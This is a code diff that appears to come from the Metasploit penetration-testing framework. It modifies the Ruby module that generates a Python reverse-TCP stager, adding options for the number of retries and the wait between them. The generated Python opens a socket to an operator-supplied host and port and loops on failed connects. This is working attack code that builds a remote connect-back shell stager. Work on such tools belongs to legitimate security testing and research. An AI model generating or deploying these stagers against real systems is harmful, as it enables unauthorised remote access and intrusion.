@@ -16,6 +16,14 @@ module Payload::Python::ReverseTcp
   include Msf::Payload::Python
   include Msf::Payload::Python::SendUUID
 
+  def initialize(*args)
+    super
+    register_advanced_options([
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 1]),
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts'])
+      ], self.class)
+  end
+
   #
   # Generate the first stage
   #
@@ -44,21 +52,24 @@ module Payload::Python::ReverseTcp
 
   def generate_reverse_tcp(opts={})
     # Set up the socket
-    cmd  = "import socket,struct#{datastore['StagerRetryWait'].to_i > 0 ? ',time' : ''}\n"
-    if datastore['StagerRetryWait'].blank? # do not retry at all (old style)
+    cmd  = "import socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
+    cmd << "counter = 0\n"
+    if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
       cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     else
-      cmd << "while 1:\n"
+      cmd << "while counter<#{opts[:retry_count].to_i}:\n"
       cmd << "\ttry:\n"
       cmd << "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
       cmd << "\t\ts.connect(('#{opts[:host]}',#{opts[:port]}))\n"
       cmd << "\t\tbreak\n"
       cmd << "\texcept:\n"
-      if datastore['StagerRetryWait'].to_i <= 0
+      if opts[:retry_wait].to_i <= 0
+        cmd << "\t\tcounter=counter+1\n"
         cmd << "\t\tpass\n" # retry immediately
       else
-        cmd << "\t\ttime.sleep(#{datastore['StagerRetryWait'].to_i})\n" # retry after waiting
+        cmd << "\t\ttime.sleep(#{opts[:retry_wait]})\n" # retry after waiting
+        cmd << "\t\tcounter=counter+1\n"
       end
     end
     cmd << py_send_uuid if include_send_uuid
